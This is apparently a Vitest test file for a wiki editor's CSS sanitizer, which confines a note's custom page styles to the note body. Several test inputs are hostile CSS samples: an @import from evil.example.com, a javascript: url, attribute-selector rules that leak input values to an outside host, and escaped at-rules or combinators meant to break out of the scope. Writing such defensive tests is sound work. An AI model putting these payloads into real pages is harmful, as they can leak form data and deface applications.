// @vitest-environment jsdom
// WP-1240 — 노트 HTML 모양의 화면 범위. 페이지 스타일 CSS 를 본문 범위로 가두는 순수 함수(scopeCss)와,
// 그 결과를 <head> 에 넣고 본문 루트에 범위 표지를 다는 확장(WikiHtmlScope)·페이지 스타일 칩(WikiStyle)을 본다.
import { docToMarkdown, markdownToDoc, wikiSchemaExtensions } from '@smart-workplace/wiki-editor-schema'
import { Editor } from '@tiptap/core'
import { afterEach, describe, expect, it } from 'vitest'

import { scopeCss, scopeSelector, WikiHtmlScope, wikiHtmlScopeKey, wikiHtmlScopeSelector } from './wikiHtmlScope'
import { WikiStyle } from './wikiStyleNode'

const S = '[data-wiki-html-scope="7"]'

describe('scopeSelector', () => {
  it('prefixes ordinary selectors with the scope', () => {
    expect(scopeSelector('.card p', S)).toBe(`${S} .card p`)
    expect(scopeSelector('*', S)).toBe(`${S} *`)
  })

  it('maps html/body/:root to the scope itself', () => {
    expect(scopeSelector('body', S)).toBe(S)
    expect(scopeSelector(':root', S)).toBe(S)
    expect(scopeSelector('html body .x', S)).toBe(`${S} .x`)
    expect(scopeSelector('html > body', S)).toBe(S)
    expect(scopeSelector('body.dark p', S)).toBe(`${S}.dark p`)
  })

  it('does not touch class/id names that only contain body or html', () => {
    expect(scopeSelector('.body #html my-body', S)).toBe(`${S} .body #html my-body`)
  })

  // 범위 밖(본문 루트의 형제 = 앱 화면)으로 나가는 선택자는 버린다(빈 글자).
  it('drops selectors that start with a combinator', () => {
    expect(scopeSelector('~ .x', S)).toBe('')
    expect(scopeSelector('+ .x', S)).toBe('')
    expect(scopeSelector('> .x', S)).toBe('')
  })

  it('drops selectors where the root (the scope itself) is followed by a sibling combinator', () => {
    expect(scopeSelector('body ~ div', S)).toBe('')
    expect(scopeSelector('html > body + *', S)).toBe('')
    expect(scopeSelector(':root.dark~p', S)).toBe('')
    expect(scopeSelector('body:has(.a) + p', S)).toBe('')
  })

  it('keeps descendant/child relations and siblings below the scope', () => {
    expect(scopeSelector('body > .a ~ .b', S)).toBe(`${S} > .a ~ .b`)
    expect(scopeSelector('.a + .b', S)).toBe(`${S} .a + .b`)
  })
})

describe('scopeCss', () => {
  it('scopes every selector of a list, keeping :is() lists intact', () => {
    expect(scopeCss('h1, :is(.a, .b) > p{color:red}', S)).toBe(`${S} h1, ${S} :is(.a, .b) > p {color:red}`)
  })

  it('maps body/html/:root rules onto the scope', () => {
    expect(scopeCss(':root{--c:#fff} body{margin:0}', S)).toBe(`${S} {--c:#fff} ${S} {margin:0}`)
  })

  it('recurses into @media and @supports but leaves @keyframes and @font-face alone', () => {
    const css =
      '@media (max-width: 600px){.a{color:red}@supports (display:grid){body{display:grid}}}' +
      '@keyframes spin{from{transform:rotate(0)}to{transform:rotate(1turn)}}' +
      '@font-face{font-family:x;src:url(data:font/woff2;base64,AA==);font-display:swap}'
    expect(scopeCss(css, S)).toBe(
      `@media (max-width: 600px){${S} .a {color:red}@supports (display:grid){${S} {display:grid}}}` +
        '@keyframes spin{from{transform:rotate(0)}to{transform:rotate(1turn)}}' +
        // 글꼴 src 도 data:image/ 가 아니면 지운다(외부·data:font 모두) — 글꼴 선언 나머지는 남는다.
        '@font-face{font-family:x;font-display:swap}',
    )
  })

  it('removes @import and allows only data:image/ urls (no https — anonymous public-share viewers must not call third parties)', () => {
    const css =
      '@import url(https://evil.example.com/x.css);.a{background:url(http://t.example.com/x.png);color:red}' +
      '.b{background:url(data:image/png;base64,AA==)}.c{background:url(javascript:alert(1))}' +
      'input[value^="a"]{background:url(https://t.example.com/?a)}'
    expect(scopeCss(css, S)).toBe(
      `${S} .a {color:red}${S} .b {background:url(data:image/png;base64,AA==)}${S} .c {}${S} input[value^="a"] {}`,
    )
  })

  it('never lets escaped/unknown at-rules or escaping combinators reach the page unscoped', () => {
    const css = '@\\6d edia all { body{display:none} } @foo{ p{x:1} } ~ .x, body ~ .y, .ok{color:red} .a{ :not(&){display:none} }'
    expect(scopeCss(css, S)).toBe(` ${S} .ok {color:red} ${S} .a { }`)
  })

  it('drops comments from selectors', () => {
    expect(scopeCss('/* 카드 */\n.card{x:1}', S)).toBe(`\n${S} .card {x:1}`)
  })
})

describe('WikiHtmlScope + WikiStyle in an editor', () => {
  let editor: Editor | null = null
  afterEach(() => {
    editor?.destroy()
    editor = null
  })

  /** 노트 본문을 그리는 화면들과 같은 확장 묶음 — 문서 스키마(페이지 스타일 칩 포함) + 범위 확장. */
  function mount(md: string, editable = true): Editor {
    editor = new Editor({
      element: document.createElement('div'),
      extensions: [...wikiSchemaExtensions({ style: WikiStyle }), WikiHtmlScope],
      content: markdownToDoc(md).toJSON(),
      editable,
    })
    return editor
  }

  const MD = [
    '<style data-wp-style>',
    'body{background:#0f172a}',
    '.card{border-radius:12px}',
    '</style>',
    '',
    '<section class="card" style="padding:16px">',
    '',
    '매출 <span class="badge" style="color:#16a34a">좋음</span>',
    '',
    '</section>',
  ].join('\n')

  it('renders the box with its tag, class and style and the span with its class and style', () => {
    const ed = mount(MD)
    const box = ed.view.dom.querySelector('section[data-wiki-html-box]') as HTMLElement
    expect(box.className).toBe('card')
    expect(box.style.padding).toBe('16px')
    const badge = box.querySelector('span[data-wiki-html-span]') as HTMLElement
    expect(badge.className).toBe('badge')
    expect(badge.style.color).toBe('rgb(22, 163, 74)')
    expect(badge.textContent).toBe('좋음')
    // 안 글자는 문서의 일반 텍스트다(편집 대상).
    expect(docToMarkdown(ed.state.doc)).toBe(MD)
  })

  it('marks the root with its scope and injects one scoped <style> into <head>, removed on destroy', () => {
    const ed = mount(MD)
    const id = wikiHtmlScopeKey.getState(ed.state)!.id
    expect(ed.view.dom.getAttribute('data-wiki-html-scope')).toBe(id)
    expect(ed.view.dom.classList.contains('wiki-html-scope')).toBe(true)
    const styles = document.head.querySelectorAll(`style[data-wiki-html-scope-style="${id}"]`)
    expect(styles).toHaveLength(1)
    const sel = wikiHtmlScopeSelector(id)
    expect(styles[0].textContent).toBe(`${sel} {background:#0f172a}\n${sel} .card {border-radius:12px}`)
    ed.destroy()
    editor = null
    expect(document.head.querySelector(`style[data-wiki-html-scope-style="${id}"]`)).toBeNull()
  })

  it('updates the injected CSS when the style node changes and drops it when deleted', () => {
    const ed = mount(MD)
    const id = wikiHtmlScopeKey.getState(ed.state)!.id
    ed.view.dispatch(ed.state.tr.setNodeMarkup(0, null, { css: 'p{color:red}' }))
    const style = () => document.head.querySelector(`style[data-wiki-html-scope-style="${id}"]`)
    expect(style()?.textContent).toBe(`${wikiHtmlScopeSelector(id)} p {color:red}`)
    ed.view.dispatch(ed.state.tr.delete(0, ed.state.doc.child(0).nodeSize))
    expect(style()).toBeNull()
    // 모양 영역이 남아 있으니 범위 가두기 클래스는 유지한다.
    expect(ed.view.dom.classList.contains('wiki-html-scope')).toBe(true)
  })

  it('leaves notes without HTML shape untouched (no containment class, no <style>)', () => {
    const ed = mount('# 제목\n\n<div>속성 없는 div</div>')
    const id = wikiHtmlScopeKey.getState(ed.state)!.id
    expect(ed.view.dom.classList.contains('wiki-html-scope')).toBe(false)
    expect(ed.view.dom.querySelector('[data-wiki-html-box]')).toBeNull()
    expect(document.head.querySelector(`style[data-wiki-html-scope-style="${id}"]`)).toBeNull()
  })

  it('shows the page-style chip and its remove button deletes the node', () => {
    const ed = mount(MD)
    const chip = ed.view.dom.querySelector('[data-testid="wiki-style-chip"]') as HTMLElement
    expect(chip.textContent).toContain('페이지 스타일')
    // 칩은 CSS 를 글자로 드러내지 않는다(실제 적용은 <head> 의 범위 스타일).
    expect(ed.view.dom.querySelector('style')).toBeNull()
    ;(chip.querySelector('button[aria-label="페이지 스타일 지우기"]') as HTMLButtonElement).click()
    expect(ed.state.doc.child(0).type.name).toBe('wikiHtmlBox')
  })

  // 노트 CSS(`[범위] div{display:none !important}` 등)가 지울 손잡이를 숨기지 못하게 보이기 속성은 인라인 !important 다.
  it('pins the chip and its remove button visible with inline !important styles', () => {
    const ed = mount(MD)
    const chip = ed.view.dom.querySelector('[data-testid="wiki-style-chip"]') as HTMLElement
    const remove = chip.querySelector('button') as HTMLElement
    for (const [el, display] of [
      [chip, 'inline-flex'],
      [remove, 'inline-flex'],
    ] as const) {
      expect(el.style.getPropertyValue('display')).toBe(display)
      for (const prop of ['display', 'visibility', 'opacity', 'pointer-events', 'position']) {
        expect(el.style.getPropertyPriority(prop)).toBe('important')
      }
      expect(el.style.getPropertyValue('visibility')).toBe('visible')
      expect(el.style.getPropertyValue('opacity')).toBe('1')
      expect(el.style.getPropertyValue('pointer-events')).toBe('auto')
    }
  })

  it('hides the chip in read-only views and follows setEditable', () => {
    const ed = mount(MD, false)
    const chip = () => ed.view.dom.querySelector('[data-testid="wiki-style-chip"]') as HTMLElement
    expect(chip().style.getPropertyValue('display')).toBe('none')
    ed.setEditable(true)
    expect(chip().style.getPropertyValue('display')).toBe('inline-flex')
    ed.setEditable(false)
    expect(chip().style.getPropertyValue('display')).toBe('none')
  })

  // 글자 입력마다 문서를 훑어도 모양이 같으면 상태 객체를 그대로 둬 CSS 범위 가두기를 다시 하지 않는다.
  it('keeps the same scope state (no re-scoping) when typing does not change the page CSS', () => {
    const ed = mount(MD)
    const before = wikiHtmlScopeKey.getState(ed.state)
    const style = document.head.querySelector(`style[data-wiki-html-scope-style="${before!.id}"]`) as HTMLStyleElement
    style.textContent = 'sentinel'
    ed.view.dispatch(ed.state.tr.insertText('추가', ed.state.doc.content.size - 3))
    ed.view.dispatch(ed.state.tr.setSelection(ed.state.selection))
    expect(wikiHtmlScopeKey.getState(ed.state)).toBe(before)
    expect(style.textContent).toBe('sentinel')
  })

  it('does not delete the style from a read-only view', () => {
    const ed = mount(MD, false)
    expect(ed.view.dom.getAttribute('contenteditable')).toBe('false')
    ;(ed.view.dom.querySelector('button[aria-label="페이지 스타일 지우기"]') as HTMLButtonElement).click()
    expect(ed.state.doc.child(0).type.name).toBe('wikiStyle')
  })

  it('keeps a separate scope per editor so two views do not share CSS', () => {
    const a = mount(MD)
    const b = new Editor({
      element: document.createElement('div'),
      extensions: [...wikiSchemaExtensions({ style: WikiStyle }), WikiHtmlScope],
      content: markdownToDoc(MD).toJSON(),
    })
    try {
      expect(wikiHtmlScopeKey.getState(a.state)!.id).not.toBe(wikiHtmlScopeKey.getState(b.state)!.id)
    } finally {
      b.destroy()
    }
  })
})

describe('이스케이프된 class 선택자 (WP-1241)', () => {
  it('Tailwind 류 이스케이프 선택자(.md\\:x·.w-1\\/2·임의값)를 범위 안으로 그대로 옮긴다', () => {
    const css = String.raw`.md\:grid-cols-2{a:b}.w-1\/2,.w-\[calc\(100\%-2rem\)\]{c:d}body .bg-\[\#0f172a\]{e:f}`
    expect(scopeCss(css, '.s')).toBe(String.raw`.s .md\:grid-cols-2 {a:b}.s .w-1\/2, .s .w-\[calc\(100\%-2rem\)\] {c:d}.s .bg-\[\#0f172a\] {e:f}`)
  })
})
